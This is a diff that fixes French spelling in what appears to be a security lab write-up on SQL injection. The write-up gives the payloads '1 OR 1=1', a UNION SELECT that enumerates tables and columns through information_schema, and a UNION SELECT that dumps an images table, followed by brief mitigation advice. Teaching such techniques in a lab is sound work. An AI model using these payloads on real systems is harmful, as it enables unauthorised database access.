@@ -1,12 +1,12 @@
 # Recherches
 
-1. Test de la requete `1 OR 1=1` dans l'input retourne toute la liste
-2. Element suspect `Hack me ?`
-3. Lister les colones
+1. Test de la requête `1 OR 1=1` dans l'input retourne toute la liste
+2. Elément suspect `Hack me ?`
+3. Lister les colonnes
    ```
    1 UNION SELECT TABLE_NAME, COLUMN_NAME FROM information_schema.columns
    ```
-4. Afficher le contenu des autres colones
+4. Afficher le contenu des autres colonnes
    ```
    1 UNION SELECT title, comment FROM list_images
    ```
@@ -18,11 +18,11 @@
 
 # Explications
 
-Les failles sql sont courrantes dans les applications qui ne securisent pas leurs entrees.
+Les failles sql sont courantes dans les applications qui ne sécurisent pas leurs entrées.
 
 # Corrections
 
-Pour eviter les failles sql plusieurs choses sont necessaires:
-     - mises a jours frequentes de la db SQL
-     - sanitize les entrees utilisateurs
+Pour éviter les failles sql plusieurs choses sont nécessaires:
+     - mises à jour fréquentes de la db SQL
+     - sanitize les entrées utilisateurs
 
